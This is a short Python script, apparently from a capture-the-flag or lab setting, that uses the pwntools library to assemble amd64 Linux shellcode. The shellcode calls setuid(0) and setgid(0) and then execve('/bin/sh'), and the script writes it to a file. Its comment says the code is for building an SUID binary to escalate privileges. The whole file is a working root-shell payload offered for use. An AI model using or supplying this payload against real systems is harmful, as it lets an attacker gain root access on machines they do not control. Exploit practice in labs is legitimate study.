# Code for generation SUID binary for privesc.
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = shellcraft.setuid(0) + shellcraft.setgid(0) + shellcraft.execve('/bin/sh')

with open("shellcode.bin" ,'wb') as f:
    f.write(asm(shellcode))